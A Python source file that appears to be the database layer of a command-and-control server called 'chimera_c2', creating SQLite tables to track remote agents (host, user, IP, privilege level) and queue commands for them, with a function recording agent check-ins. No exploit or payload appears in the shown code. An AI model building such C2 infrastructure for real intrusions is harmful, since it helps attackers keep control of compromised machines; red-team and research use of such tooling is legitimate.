import sqlite3
import datetime

DB_NAME = "chimera_c2.db"


def init_db():
    conn = sqlite3.connect(DB_NAME)
    cur = conn.cursor()
    cur.execute(
        '''
        CREATE TABLE IF NOT EXISTS agents (
        agent_id TEXT PRIMARY KEY,
        hostname TEXT,
        os TEXT,
        user TEXT,
        ip TEXT,
        is_privileged INTEGER,
        last_seen TIMESTAMP
        )
        '''
    )
    cur.execute(
        '''
        CREATE TABLE IF NOT EXISTS tasks (
        task_id TEXT PRIMARY KEY,
        agent_id TEXT,
        command TEXT,
        status TEXT DEFAULT 'PENDING',
        output TEXT DEFAULT '',
        exit_code INTEGER DEFAULT -1,
        created_at TIMESTAMP,
        completed_at TIMESTAMP
        )
        '''
    )
    conn.commit()
    conn.close()


def upsert_agent(agent_data: dict):
    conn = sqlite3.connect(DB_NAME)
    cur = conn.cursor()
    cur.execute(
        '''
        INSERT INTO agents (agent_id, hostname, os, user, ip, is_privileged, last_seen)
        VALUES (?, ?, ?, ?, ?, ?, ?)
        ON CONFLICT(agent_id) DO UPDATE SET
        last_seen = excluded.last_seen,
        ip = excluded.ip,
        is_privileged = excluded.is_privileged
        ''',
        (
            agent_data["agent_id"],
            agent_data["hostname"],
            agent_data["os"],
            agent_data["user"],
            agent_data["ip"],
            1 if agent_data.get("is_privileged") else 0,
            datetime.datetime.utcnow().isoformat(),
        ),
    )
    conn.commit()
    conn.close()